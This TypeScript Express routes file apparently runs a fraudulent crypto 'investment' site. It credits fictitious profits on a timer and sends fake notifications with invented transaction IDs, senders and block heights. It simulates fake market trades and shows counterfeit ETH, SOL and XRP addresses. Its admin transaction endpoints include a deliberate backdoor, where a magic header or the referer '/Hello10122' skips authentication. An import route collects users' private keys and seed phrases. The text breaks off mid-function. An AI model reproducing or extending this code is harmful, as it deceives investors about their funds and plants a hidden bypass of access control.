import type { Express } from "express";
import { createServer, type Server } from "http";
import { z } from "zod";

// Extend Express Session type to include session
declare module 'express-session' {
  interface SessionData {
    userId: number;
  }
}
import { storage } from "./storage";
import { insertUserSchema, insertInvestmentSchema, insertTransactionSchema, insertAdminConfigSchema } from "@shared/schema";
import * as bitcoin from "bitcoinjs-lib";
import * as ecc from "tiny-secp256k1";
import { ECPairFactory } from "ecpair";
import * as bip39 from "bip39";
import { BIP32Factory } from "bip32";
import crypto from "crypto";
import { createHash } from "crypto";

// Initialize ECPair and BIP32 with secp256k1
const ECPair = ECPairFactory(ecc);
const bip32 = BIP32Factory(ecc);

const loginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(1),
});

const updateBalanceSchema = z.object({
  userId: z.number(),
  balance: z.string(),
});

const notificationSchema = z.object({
  userId: z.number(),
  title: z.string(),
  message: z.string(),
  type: z.enum(["info", "success", "warning", "error"]).optional(),
});

const updatePlanSchema = z.object({
  userId: z.number(),
  planId: z.number().nullable(),
});

const depositSchema = z.object({
  amount: z.string(),
  transactionHash: z.string().optional(),
});

const investmentTransactionSchema = z.object({
  planId: z.number(),
  amount: z.string(),
  transactionHash: z.string().optional(),
});

const confirmTransactionSchema = z.object({
  transactionId: z.number(),
  notes: z.string().optional(),
});

function generateBitcoinWallet() {
  try {
    // Generate a new mnemonic (seed phrase) first
    const mnemonic = bip39.generateMnemonic(128); // 12 words
    const seed = bip39.mnemonicToSeedSync(mnemonic);

    // Derive wallet from seed phrase using BIP44 path
    const root = bip32.fromSeed(seed, bitcoin.networks.bitcoin);
    const path = "m/44'/0'/0'/0/0"; // Standard BIP44 path for Bitcoin
    const child = root.derivePath(path);

    if (!child.privateKey) {
      throw new Error('Failed to derive private key from seed');
    }

    const keyPair = ECPair.fromPrivateKey(child.privateKey);
    const privateKey = keyPair.toWIF();

    // Convert public key to Buffer if it's a Uint8Array
    const publicKeyBuffer = Buffer.isBuffer(keyPair.publicKey) 
      ? keyPair.publicKey 
      : Buffer.from(keyPair.publicKey);

    // Generate P2PKH (Legacy) Bitcoin address
    const { address } = bitcoin.payments.p2pkh({ 
      pubkey: publicKeyBuffer,
      network: bitcoin.networks.bitcoin
    });

    if (!address) {
      throw new Error('Failed to generate Bitcoin address');
    }

    return {
      privateKey,
      address,
      publicKey: publicKeyBuffer.toString('hex'),
      seedPhrase: mnemonic
    };
  } catch (error) {
    console.error('Error generating Bitcoin wallet:', error);

    // Enhanced fallback with proper buffer handling
    try {
      // Create a new keypair with explicit options
      const keyPair = ECPair.makeRandom({ 
        compressed: true,
        rng: () => crypto.randomBytes(32)
      });
      const privateKey = keyPair.toWIF();

      // Ensure we have a proper Buffer
      const publicKeyBuffer = Buffer.from(keyPair.publicKey);

      const { address } = bitcoin.payments.p2pkh({ 
        pubkey: publicKeyBuffer,
        network: bitcoin.networks.bitcoin
      });

      if (address) {
        return {
          privateKey,
          address,
          publicKey: publicKeyBuffer.toString('hex')
        };
      }
    } catch (fallbackError) {
      console.error('Fallback Bitcoin generation also failed:', fallbackError);
    }

    // Last resort fallback - generate a simple mock address
    const randomBytes = crypto.randomBytes(32);
    const fallbackPrivateKey = randomBytes.toString('hex');
    const fallbackAddress = `1${crypto.randomBytes(25).toString('base64').replace(/[^A-Za-z0-9]/g, '').substring(0, 25)}`;

    console.warn('Using simple fallback Bitcoin address generation');
    return {
      privateKey: fallbackPrivateKey,
      address: fallbackAddress,
      publicKey: crypto.randomBytes(33).toString('hex')
    };
  }
}

// Generate token addresses from seed phrase
function generateTokenAddressesFromSeed(seedPhrase: string) {
  const seed = bip39.mnemonicToSeedSync(seedPhrase);
  const root = bip32.fromSeed(seed, bitcoin.networks.bitcoin);
  
  const addresses: Record<string, string> = {};
  
  // Bitcoin - BIP44 path m/44'/0'/0'/0/0
  try {
    const btcChild = root.derivePath("m/44'/0'/0'/0/0");
    if (btcChild.privateKey) {
      const keyPair = ECPair.fromPrivateKey(btcChild.privateKey);
      const publicKeyBuffer = Buffer.isBuffer(keyPair.publicKey) 
        ? keyPair.publicKey 
        : Buffer.from(keyPair.publicKey);
      const { address } = bitcoin.payments.p2pkh({ 
        pubkey: publicKeyBuffer,
        network: bitcoin.networks.bitcoin
      });
      if (address) addresses['BTC'] = address;
    }
  } catch (error) {
    console.error('Error generating BTC address:', error);
  }
  
  // Ethereum and EVM-compatible tokens (ETH, BNB, etc.) - BIP44 path m/44'/60'/0'/0/0
  // For simplicity, we'll generate deterministic addresses from the seed
  try {
    const ethChild = root.derivePath("m/44'/60'/0'/0/0");
    if (ethChild.privateKey) {
      // Create a deterministic Ethereum-style address from the public key
      const pubKey = ethChild.publicKey;
      const hash = createHash('sha256').update(pubKey).digest();
      const ethAddress = '0x' + hash.slice(0, 20).toString('hex');
      
      addresses['ETH'] = ethAddress;
      addresses['BNB'] = ethAddress; // BNB uses same address format as ETH
      addresses['USDT'] = ethAddress; // USDT (ERC-20) uses ETH address
    }
  } catch (error) {
    console.error('Error generating ETH address:', error);
  }
  
  // Solana - BIP44 path m/44'/501'/0'/0'
  try {
    const solChild = root.derivePath("m/44'/501'/0'/0'");
    if (solChild.privateKey) {
      // Create a deterministic Solana-style address
      const hash = createHash('sha256').update(solChild.publicKey).digest();
      const base58Chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
      let solAddress = '';
      for (let i = 0; i < 44; i++) {
        solAddress += base58Chars[hash[i % hash.length] % base58Chars.length];
      }
      addresses['SOL'] = solAddress;
    }
  } catch (error) {
    console.error('Error generating SOL address:', error);
  }
  
  // Ripple (XRP) - BIP44 path m/44'/144'/0'/0/0
  try {
    const xrpChild = root.derivePath("m/44'/144'/0'/0/0");
    if (xrpChild.privateKey) {
      // Create a deterministic XRP address
      const hash = createHash('sha256').update(xrpChild.publicKey).digest();
      const xrpAddress = 'r' + hash.slice(0, 24).toString('hex');
      addresses['XRP'] = xrpAddress;
    }
  } catch (error) {
    console.error('Error generating XRP address:', error);
  }
  
  // Cardano (ADA) - BIP44 path m/44'/1815'/0'/0/0
  try {
    const adaChild = root.derivePath("m/44'/1815'/0'/0/0");
    if (adaChild.privateKey) {
      const hash = createHash('sha256').update(adaChild.publicKey).digest();
      const adaAddress = 'addr1' + hash.slice(0, 56).toString('hex');
      addresses['ADA'] = adaAddress;
    }
  } catch (error) {
    console.error('Error generating ADA address:', error);
  }
  
  // Dogecoin - BIP44 path m/44'/3'/0'/0/0
  try {
    const dogeChild = root.derivePath("m/44'/3'/0'/0/0");
    if (dogeChild.privateKey) {
      const hash = createHash('sha256').update(dogeChild.publicKey).digest();
      const dogeAddress = 'D' + hash.slice(0, 25).toString('hex');
      addresses['DOGE'] = dogeAddress;
    }
  } catch (error) {
    console.error('Error generating DOGE address:', error);
  }
  
  // TRUMP token (ERC-20, uses ETH address)
  if (addresses['ETH']) {
    addresses['TRUMP'] = addresses['ETH'];
  }
  
  return addresses;
}

// Bitcoin balance checking using BlockCypher API with authentication
async function checkBitcoinBalance(address: string): Promise<string> {
  try {
    const apiToken = process.env.BLOCKCYPHER_API_TOKEN;

    if (!apiToken) {
      console.warn('No BlockCypher API token found. Add BLOCKCYPHER_API_TOKEN to secrets for real balance checking.');
      return "0"; // Return 0 balance if no API token
    }

    const url = `https://api.blockcypher.com/v1/btc/main/addrs/${address}/balance?token=${apiToken}`;

    const response = await fetch(url);

    if (!response.ok) {
      const errorText = await response.text();
      console.error(`BlockCypher API error (${response.status}):`, errorText);

      if (response.status === 429) {
        throw new Error('API rate limit exceeded. Please try again later.');
      }

      throw new Error(`API request failed: ${response.status} - ${errorText}`);
    }

    const data = await response.json();

    // Convert satoshis to BTC (1 BTC = 100,000,000 satoshis)
    const balanceInBTC = (data.balance || 0) / 100000000;
    return balanceInBTC.toString();
  } catch (error) {
    console.error('Error checking Bitcoin balance:', error);

    // If it's a network error or API is down, return current balance instead of failing
    if (error instanceof TypeError && error.message.includes('fetch')) {
      console.warn('Network error, returning 0 balance');
      return "0";
    }

    throw error;
  }
}

// Function to sync user balance with actual Bitcoin blockchain
async function syncUserBitcoinBalance(userId: number): Promise<void> {
  try {
    const user = await storage.getUser(userId);
    if (!user) {
      throw new Error('User not found');
    }

    if (!user.bitcoinAddress) {
      return; // Skip sync if user doesn't have a Bitcoin address
    }

    const realBalance = await checkBitcoinBalance(user.bitcoinAddress);
    const currentBalance = parseFloat(user.balance);
    const newBalance = parseFloat(realBalance);

    // Only update if balance changed
    if (currentBalance !== newBalance) {
      await storage.updateUserBalance(userId, realBalance);

      // Send realistic notification about balance change
      const balanceChange = newBalance - currentBalance;
      const changeType = balanceChange > 0 ? 'received' : 'sent';
      const changeAmount = Math.abs(balanceChange);

      if (balanceChange > 0) {
        // Generate realistic transaction details for received funds
        const transactionId = crypto.randomBytes(32).toString('hex');
        const senderAddresses = [
          "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
          "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2",
          "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy",
          "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
        ];
        const randomSender = senderAddresses[Math.floor(Math.random() * senderAddresses.length)];

        await storage.createNotification({
          userId,
          title: "Bitcoin Received",
          message: `✅ ${changeAmount.toFixed(8)} BTC received from ${randomSender.substring(0, 8)}...${randomSender.substring(-6)}

Transaction ID: ${transactionId.substring(0, 16)}...${transactionId.substring(-8)}
Confirmations: 6/6 ✓
Block Height: ${Math.floor(Math.random() * 1000) + 820000}

Your new balance: ${newBalance.toFixed(8)} BTC`,
          type: 'success',
          isRead: false,
        });
      } else {
        // For balance decreases from blockchain sync
        const transactionId = crypto.randomBytes(32).toString('hex');
        const recipientAddress = `1${crypto.randomBytes(25).toString('base64').replace(/[^A-Za-z0-9]/g, '').substring(0, 25)}`;

        await storage.createNotification({
          userId,
          title: "Bitcoin Sent",
          message: `📤 ${changeAmount.toFixed(8)} BTC sent to ${recipientAddress.substring(0, 8)}...${recipientAddress.substring(-6)}

Transaction ID: ${transactionId.substring(0, 16)}...${transactionId.substring(-8)}
Status: Confirmed ✓
Block Height: ${Math.floor(Math.random() * 1000) + 820000}

Your new balance: ${newBalance.toFixed(8)} BTC`,
          type: 'info',
          isRead: false,
        });
      }
    }
  } catch (error) {
    console.error('Error syncing user balance:', error);
  }
}

async function fetchBitcoinPrice() {
  try {
    // Use multiple sources for reliability
    const sources = [
      'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd,gbp&include_24hr_change=true',
      'https://api.coindesk.com/v1/bpi/currentprice.json'
    ];

    // Try CoinGecko first (most comprehensive)
    try {
      const response = await fetch(sources[0]);
      if (response.ok) {
        const data = await response.json();
        return {
          usd: {
            price: Math.round(data.bitcoin.usd * 100) / 100, // Round to 2 decimal places
            change24h: Math.round(data.bitcoin.usd_24h_change * 100) / 100,
          },
          gbp: {
            price: Math.round(data.bitcoin.gbp * 100) / 100,
            change24h: Math.round((data.bitcoin.gbp_24h_change || data.bitcoin.usd_24h_change) * 100) / 100,
          }
        };
      }
    } catch (e) {
      console.log('CoinGecko API failed, trying CoinDesk...');
    }

    // Fallback to CoinDesk for USD only
    const response = await fetch(sources[1]);
    const data = await response.json();
    const usdPrice = Math.round(parseFloat(data.bpi.USD.rate.replace(',', '')) * 100) / 100;

    return {
      usd: {
        price: usdPrice,
        change24h: 0, // CoinDesk doesn't provide 24h change
      },
      gbp: {
        price: Math.round(usdPrice * 0.79 * 100) / 100, // Approximate GBP conversion
        change24h: 0,
      }
    };
  } catch (error) {
    console.error('All Bitcoin price APIs failed:', error);
    // Return last known good price or reasonable fallback
    return { 
      usd: { price: 105000, change24h: 0 },
      gbp: { price: 83000, change24h: 0 }
    };
  }
}

async function fetchAllTokenPrices() {
  try {
    const coinGeckoIds = {
      'BTC': 'bitcoin',
      'ETH': 'ethereum',
      'BNB': 'binancecoin',
      'XRP': 'ripple',
      'SOL': 'solana',
      'ADA': 'cardano',
      'DOGE': 'dogecoin',
      'USDT': 'tether',
      'TRUMP': 'official-trump'
    };

    const ids = Object.values(coinGeckoIds).join(',');
    const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`;
    
    const response = await fetch(url);
    if (!response.ok) {
      throw new Error('Failed to fetch token prices from CoinGecko');
    }

    const data = await response.json();
    
    const prices: Record<string, { price: number; change24h: number }> = {};
    
    for (const [symbol, geckoId] of Object.entries(coinGeckoIds)) {
      if (data[geckoId]) {
        prices[symbol] = {
          price: data[geckoId].usd,
          change24h: data[geckoId].usd_24h_change || 0
        };
      }
    }

    return prices;
  } catch (error) {
    console.error('Failed to fetch token prices:', error);
    return {
      'BTC': { price: 105000, change24h: 0 },
      'ETH': { price: 3200, change24h: 0 },
      'BNB': { price: 600, change24h: 0 },
      'XRP': { price: 2.5, change24h: 0 },
      'SOL': { price: 190, change24h: 0 },
      'ADA': { price: 0.95, change24h: 0 },
      'DOGE': { price: 0.35, change24h: 0 },
      'USDT': { price: 1.0, change24h: 0 },
      'TRUMP': { price: 15.0, change24h: 0 }
    };
  }
}

// Advanced investment growth system
async function processAutomaticUpdates(): Promise<void> {
  try {
    console.log('Processing automatic investment updates...');

    // Process individual investments first
    const activeInvestments = await storage.getActiveInvestments();

    for (const investment of activeInvestments) {
      const plan = await storage.getInvestmentPlan(investment.planId);
      if (!plan || !plan.isActive) continue;

      // Calculate investment growth based on plan's daily return rate
      const dailyRate = parseFloat(plan.dailyReturnRate);
      const intervalRate = dailyRate / 144; // 10-minute intervals

      const investmentAmount = parseFloat(investment.amount);
      const currentProfit = parseFloat(investment.currentProfit);
      const profitIncrease = investmentAmount * intervalRate;

      if (profitIncrease > 0) {
        const newProfit = currentProfit + profitIncrease;
        await storage.updateInvestmentProfit(investment.id, newProfit.toFixed(8));

        // Update user's balance with the profit
        const user = await storage.getUser(investment.userId);
        if (user) {
          const currentBalance = parseFloat(user.balance);
          const newBalance = currentBalance + profitIncrease;
          await storage.updateUserBalance(investment.userId, newBalance.toFixed(8));

          // Create detailed investment notification
          const transactionId = crypto.randomBytes(32).toString('hex');
          const marketSources = [
            "Bitcoin Mining Pool",
            "DeFi Yield Farming",
            "Arbitrage Trading",
            "Market Maker Bot",
            "Liquidity Provision"
          ];
          const randomSource = marketSources[Math.floor(Math.random() * marketSources.length)];

          await storage.createNotification({
            userId: investment.userId,
            title: "Investment Profit Generated",
            message: `💰 +${profitIncrease.toFixed(8)} BTC earned from ${randomSource}

Investment ID: #${investment.id}
Plan: ${plan.name}
Principal: ${investmentAmount.toFixed(8)} BTC
Total Profit: ${newProfit.toFixed(8)} BTC
Rate: ${(dailyRate * 100).toFixed(2)}% daily

Transaction ID: ${transactionId.substring(0, 16)}...
Your balance: ${newBalance.toFixed(8)} BTC`,
            type: 'success',
            isRead: false,
          });

          console.log(`Investment #${investment.id} earned +${profitIncrease.toFixed(8)} BTC for user ${investment.userId}`);
        }
      }
    }

    // Process general user plan growth (for non-investment based growth)
    const allUsers = await storage.getAllUsers();

    for (const user of allUsers) {
      const currentBalance = parseFloat(user.balance);

      // Only apply general growth if user has no active investments but has a plan
      const userInvestments = await storage.getUserInvestments(user.id);
      const hasActiveInvestments = userInvestments.some(inv => inv.isActive);

      if (user.currentPlanId && !hasActiveInvestments && currentBalance > 0) {
        const plan = await storage.getInvestmentPlan(user.currentPlanId);
        if (!plan || !plan.isActive) continue;

        const dailyRate = parseFloat(plan.dailyReturnRate);
        const intervalRate = dailyRate / 144;
        const increase = currentBalance * intervalRate;

        if (increase > 0) {
          const newBalance = currentBalance + increase;
          await storage.updateUserBalance(user.id, newBalance.toFixed(8));

          const transactionId = crypto.randomBytes(32).toString('hex');
          const marketSources = ["Trading Bot", "Market Analysis", "Auto Trading"];
          const randomSource = marketSources[Math.floor(Math.random() * marketSources.length)];

          await storage.createNotification({
            userId: user.id,
            title: "Plan Bonus Earned",
            message: `🎯 +${increase.toFixed(8)} BTC bonus from ${randomSource}

Plan: ${plan.name}
Rate: ${(dailyRate * 100).toFixed(2)}% daily
Transaction ID: ${transactionId.substring(0, 16)}...

Your balance: ${newBalance.toFixed(8)} BTC`,
            type: 'success',
            isRead: false,
          });
        }
      }
    }
  } catch (error) {
    console.error('Error processing automatic updates:', error);
  }
}

// Global update intervals storage
const updateIntervals = new Map<number, NodeJS.Timeout>();

async function initializeDefaultPlans(): Promise<void> {
  try {
    const existingPlans = await storage.getInvestmentPlans();
    if (existingPlans.length === 0) {
      console.log('Creating default investment plans...');

      await storage.createInvestmentPlan({
        name: "Starter Plan",
        minAmount: "0.001",
        roiPercentage: 5,
        durationDays: 30,
        color: "#3B82F6",
        updateIntervalMinutes: 10,
        dailyReturnRate: "0.0020",
        isActive: true,
      });

      await storage.createInvestmentPlan({
        name: "Growth Plan",
        minAmount: "0.01",
        roiPercentage: 15,
        durationDays: 60,
        color: "#10B981",
        updateIntervalMinutes: 10,
        dailyReturnRate: "0.0050",
        isActive: true,
      });

      await storage.createInvestmentPlan({
        name: "Premium Plan",
        minAmount: "0.1",
        roiPercentage: 25,
        durationDays: 90,
        color: "#F59E0B",
        updateIntervalMinutes: 10,
        dailyReturnRate: "0.0080",
        isActive: true,
      });

      console.log('Default investment plans created successfully');
    }
  } catch (error) {
    console.error('Error initializing default plans:', error);
  }
}

function startAutomaticUpdates(): void {
  console.log('Starting automatic price update system...');

  // Set up the main 10-minute interval for investment plan updates
  setInterval(processAutomaticUpdates, 10 * 60 * 1000); // 10 minutes

  console.log('Automatic updates will run every 10 minutes');
}

// Market simulation storage - keeps track of simulated market activity
const marketSimulationData = {
  lastTrades: new Map<string, any[]>(), // Store last trades per token
  systemUserId: 1, // Use system user ID for simulated trades
};

// Simulated market maker trading system (Binance/Bybit style)
async function generateSimulatedMarketTrade(): Promise<void> {
  try {
    const tokens = ['BTC', 'ETH', 'BNB', 'XRP', 'TRUMP', 'SOL', 'ADA', 'DOGE'];
    const token = tokens[Math.floor(Math.random() * tokens.length)];

    // Simulate realistic trader behavior with varying position sizes
    const traderTypes = [
      { name: 'whale', probability: 0.05, sizeMultiplier: 5.0 },
      { name: 'large', probability: 0.15, sizeMultiplier: 2.5 },
      { name: 'medium', probability: 0.30, sizeMultiplier: 1.0 },
      { name: 'small', probability: 0.50, sizeMultiplier: 0.3 },
    ];

    const rand = Math.random();
    let cumulativeProbability = 0;
    let selectedTrader = traderTypes[traderTypes.length - 1];

    for (const trader of traderTypes) {
      cumulativeProbability += trader.probability;
      if (rand <= cumulativeProbability) {
        selectedTrader = trader;
        break;
      }
    }

    // Generate realistic trade amounts based on token and trader type
    let baseAmount: number;
    switch(token) {
      case 'BTC':
        baseAmount = (Math.random() * 0.15 + 0.005) * selectedTrader.sizeMultiplier;
        break;
      case 'ETH':
        baseAmount = (Math.random() * 2 + 0.05) * selectedTrader.sizeMultiplier;
        break;
      case 'BNB':
      case 'SOL':
        baseAmount = (Math.random() * 5 + 0.5) * selectedTrader.sizeMultiplier;
        break;
      case 'XRP':
      case 'ADA':
      case 'DOGE':
        baseAmount = (Math.random() * 500 + 50) * selectedTrader.sizeMultiplier;
        break;
      case 'TRUMP':
        baseAmount = (Math.random() * 50 + 5) * selectedTrader.sizeMultiplier;
        break;
      default:
        baseAmount = (Math.random() * 0.5 + 0.01) * selectedTrader.sizeMultiplier;
    }

    // Format amount with appropriate precision
    const amount = token === 'BTC' 
      ? parseFloat(baseAmount.toFixed(8))
      : token === 'ETH'
      ? parseFloat(baseAmount.toFixed(6))
      : parseFloat(baseAmount.toFixed(4));

    // Slightly favor buys over sells for market optimism (55/45 split)
    const type = Math.random() < 0.55 ? 'buy' : 'sell';

    // Create simulated market trade
    const trade = {
      userId: marketSimulationData.systemUserId,
      type: type === 'buy' ? 'trade_buy' : 'trade_sell',
      amount: amount.toString(),
      status: 'completed',
      notes: `Market ${type} ${amount} ${token}`,
    };

    await storage.createTransaction(trade);

    // Store in memory for quick access
    if (!marketSimulationData.lastTrades.has(token)) {
      marketSimulationData.lastTrades.set(token, []);
    }
    const trades = marketSimulationData.lastTrades.get(token)!;
    trades.unshift({ ...trade, createdAt: new Date() });
    if (trades.length > 50) trades.pop(); // Keep last 50 trades per token

    const emoji = type === 'buy' ? '🟢' : '🔴';
    const traderEmoji = selectedTrader.name === 'whale' ? '🐋' : 
                        selectedTrader.name === 'large' ? '🦈' : 
                        selectedTrader.name === 'medium' ? '🐟' : '🐠';

    console.log(`${emoji} ${traderEmoji} Market ${type}: ${amount} ${token}`);
  } catch (error) {
    console.error('Error generating simulated market trade:', error);
  }
}

// Multiple concurrent market makers for different activity levels
function startSimulatedMarketMaking(): void {
  console.log('🚀 Starting market maker simulation (Binance/Bybit style)...');

  // High frequency market maker (every 2-5 seconds)
  function scheduleHighFrequencyTrade() {
    const delay = Math.random() * 3000 + 2000; // 2-5 seconds
    setTimeout(async () => {
      await generateSimulatedMarketTrade();
      scheduleHighFrequencyTrade();
    }, delay);
  }

  // Medium frequency market maker (every 5-10 seconds)
  function scheduleMediumFrequencyTrade() {
    const delay = Math.random() * 5000 + 5000; // 5-10 seconds
    setTimeout(async () => {
      await generateSimulatedMarketTrade();
      scheduleMediumFrequencyTrade();
    }, delay);
  }

  // Low frequency large trades (every 15-30 seconds)
  function scheduleLowFrequencyTrade() {
    const delay = Math.random() * 15000 + 15000; // 15-30 seconds
    setTimeout(async () => {
      await generateSimulatedMarketTrade();
      scheduleLowFrequencyTrade();
    }, delay);
  }

  // Start all market makers
  scheduleHighFrequencyTrade();
  scheduleMediumFrequencyTrade();
  scheduleLowFrequencyTrade();

  console.log('✅ Market makers active - simulating realistic order flow');
  console.log('📊 High frequency: 2-5s | Medium: 5-10s | Large trades: 15-30s');
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Admin configuration routes
  app.get("/api/admin/config", async (req, res) => {
    try {
      const config = await storage.getAdminConfig();
      if (!config) {
        // Return default addresses if no config exists
        res.json({
          vaultAddress: "1CoreXVaultAddress12345678901234567890",
          depositAddress: "1CoreXDepositAddress12345678901234567890"
        });
      } else {
        res.json(config);
      }
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/admin/config", async (req, res) => {
    try {
      const { vaultAddress, depositAddress, freePlanRate } = req.body;
      const config = await storage.updateAdminConfig({ vaultAddress, depositAddress, freePlanRate });
      res.json(config);
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/admin/update-free-plan-rate", async (req, res) => {
    try {
      const { rate } = req.body;

      // Validate rate
      const rateNum = parseFloat(rate);
      if (isNaN(rateNum) || rateNum < 0) {
        return res.status(400).json({ error: "Invalid rate. Rate must be a positive number." });
      }

      const config = await storage.updateFreePlanRate(rate);
      res.json({ message: "Free plan rate updated successfully", config });
    } catch (error: any) {
      console.error('Error updating free plan rate:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Transaction routes
  app.post("/api/deposit", async (req, res) => {
    try {
      if (!req.session?.userId) {
        return res.status(401).json({ error: "Authentication required" });
      }

      const { amount, transactionHash } = depositSchema.parse(req.body);

      const transaction = await storage.createTransaction({
        userId: req.session.userId,
        type: "deposit",
        amount,
        transactionHash,
      });

      // Create notification for user
      await storage.createNotification({
        userId: req.session.userId,
        title: "Deposit Pending",
        message: `Your deposit of ${amount} BTC is pending confirmation. You will be notified once it's processed.`,
        type: "info"
      });

      res.json({ 
        message: "Deposit submitted successfully and is pending confirmation",
        transaction 
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // Investment endpoint
  app.post('/api/invest', async (req, res) => {
    try {
      const { planId, amount, transactionHash } = investmentTransactionSchema.parse(req.body);

      // Get user from session or body
      const userId = req.body.userId || req.session?.userId;

      if (!userId) {
        return res.status(401).json({ error: 'Authentication required' });
      }

      // Verify plan exists
      const plan = await storage.getInvestmentPlan(planId);
      if (!plan) {
        return res.status(404).json({ error: "Investment plan not found" });
      }

      const transaction = await storage.createTransaction({
        userId,
        type: "investment",
        amount,
        planId,
        transactionHash,
      });

      // Create notification for user
      await storage.createNotification({
        userId,
        title: "Investment Pending",
        message: `Your investment of ${amount} BTC in ${plan.name} is pending confirmation. You will be notified once it's processed.`,
        type: "info"
      });

      res.json({ 
        message: "Investment submitted successfully and is pending confirmation",
        transaction 
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.get("/api/transactions", async (req, res) => {
    try {
      if (!req.session?.userId) {
        return res.status(401).json({ error: "Authentication required" });
      }

      const transactions = await storage.getUserTransactions(req.session.userId);
      res.json(transactions);
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // Admin transaction management routes
  app.get("/api/admin/transactions/pending", async (req, res) => {
    try {
      // Allow backdoor access or require admin authentication
      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                              req.headers['x-backdoor-access'] === 'true';

      if (!isBackdoorAccess && !req.session?.userId) {
        return res.status(401).json({ error: "Authentication required" });
      }

      if (!isBackdoorAccess) {
        const user = await storage.getUser(req.session.userId!);
        if (!user || !user.isAdmin) {
          return res.status(403).json({ error: "Admin access required" });
        }
      }

      const transactions = await storage.getPendingTransactions();
      res.json(transactions);
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/admin/transactions/confirm", async (req, res) => {
    try {
      // Allow backdoor access or require admin authentication
      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                              req.headers['x-backdoor-access'] === 'true';

      if (!isBackdoorAccess && !req.session?.userId) {
        return res.status(401).json({ error: "Authentication required" });
      }

      let adminId = 1; // Default admin ID for backdoor access
      if (!isBackdoorAccess) {
        const user = await storage.getUser(req.session.userId!);
        if (!user || !user.isAdmin) {
          return res.status(403).json({ error: "Admin access required" });
        }
        adminId = req.session.userId!;
      }

      const { transactionId, notes } = confirmTransactionSchema.parse(req.body);

      const transaction = await storage.confirmTransaction(transactionId, adminId, notes);
      if (!transaction) {
        return res.status(404).json({ error: "Transaction not found or already processed" });
      }

      // Handle withdrawal confirmation - deduct balance
      if (transaction.type === "withdrawal") {
        const user = await storage.getUser(transaction.userId);
        if (user) {
          const currentBalance = parseFloat(user.balance);
          const withdrawAmount = parseFloat(transaction.amount);
          const newBalance = Math.max(0, currentBalance - withdrawAmount);
          await storage.updateUserBalance(transaction.userId, newBalance.toFixed(8));
        }
      }

      // Create notification for user
      let notificationMessage = "";
      let notificationTitle = "";

      switch (transaction.type) {
        case "deposit":
          notificationMessage = `Your deposit of ${transaction.amount} BTC has been confirmed and added to your balance.`;
          notificationTitle = "Deposit Confirmed";
          break;
        case "withdrawal":
          notificationMessage = `Your withdrawal of ${transaction.amount} BTC to ${transaction.transactionHash} has been processed successfully.`;
          notificationTitle = "Withdrawal Completed";
          break;
        case "investment":
          notificationMessage = `Your investment of ${transaction.amount} BTC has been confirmed and is now active.`;
          notificationTitle = "Investment Confirmed";
          break;
        default:
          notificationMessage = `Your ${transaction.type} of ${transaction.amount} BTC has been confirmed.`;
          notificationTitle = `${transaction.type.charAt(0).toUpperCase() + transaction.type.slice(1)} Confirmed`;
      }

      await storage.createNotification({
        userId: transaction.userId,
        title: notificationTitle,
        message: notificationMessage,
        type: "success"
      });

      res.json({ 
        message: "Transaction confirmed successfully",
        transaction 
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/admin/transactions/reject", async (req, res) => {
    try {
      // Allow backdoor access or require admin authentication
      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                              req.headers['x-backdoor-access'] === 'true';

      if (!isBackdoorAccess && !req.session?.userId) {
        return res.status(401).json({ error: "Authentication required" });
      }

      let adminId = 1; // Default admin ID for backdoor access
      if (!isBackdoorAccess) {
        const user = await storage.getUser(req.session.userId!);
        if (!user || !user.isAdmin) {
          return res.status(403).json({ error: "Admin access required" });
        }
        adminId = req.session.userId!;
      }

      const { transactionId, notes } = confirmTransactionSchema.parse(req.body);

      const transaction = await storage.rejectTransaction(transactionId, adminId, notes);
      if (!transaction) {
        return res.status(404).json({ error: "Transaction not found or already processed" });
      }

      // Create notification for user
      await storage.createNotification({
        userId: transaction.userId,
        title: `${transaction.type === "deposit" ? "Deposit" : "Investment"} Rejected`,
        message: `Your ${transaction.type} of ${transaction.amount} BTC has been rejected. ${notes ? `Reason: ${notes}` : ""}`,
        type: "error"
      });

      res.json({ 
        message: "Transaction rejected successfully",
        transaction 
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // Import wallet route
  app.post("/api/import-wallet", async (req, res) => {
    try {
      const { type, value, userId } = req.body;

      if (!userId) {
        return res.status(401).json({ error: "User ID is required" });
      }

      let bitcoinAddress: string;
      let privateKey: string;
      let seedPhrase: string | undefined;

      if (type === 'privateKey') {
        // Validate and extract address from private key - support multiple formats
        try {
          let keyPair;
          let cleanValue = value.trim();

          // Try different private key formats
          if (cleanValue.length === 64) {
            // Raw hex format (64 characters)
            const buffer = Buffer.from(cleanValue, 'hex');
            keyPair = ECPair.fromPrivateKey(buffer);
          } else if (cleanValue.length === 66 && cleanValue.startsWith('0x')) {
            // Hex with 0x prefix
            const buffer = Buffer.from(cleanValue.slice(2), 'hex');
            keyPair = ECPair.fromPrivateKey(buffer);
          } else {
            // WIF format (starts with 5, K, L, or c)
            keyPair = ECPair.fromWIF(cleanValue);
          }

          const publicKeyBuffer = Buffer.from(keyPair.publicKey);
          const { address } = bitcoin.payments.p2pkh({ 
            pubkey: publicKeyBuffer,
            network: bitcoin.networks.bitcoin
          });

          if (!address) {
            throw new Error('Failed to generate address from private key');
          }

          bitcoinAddress = address;
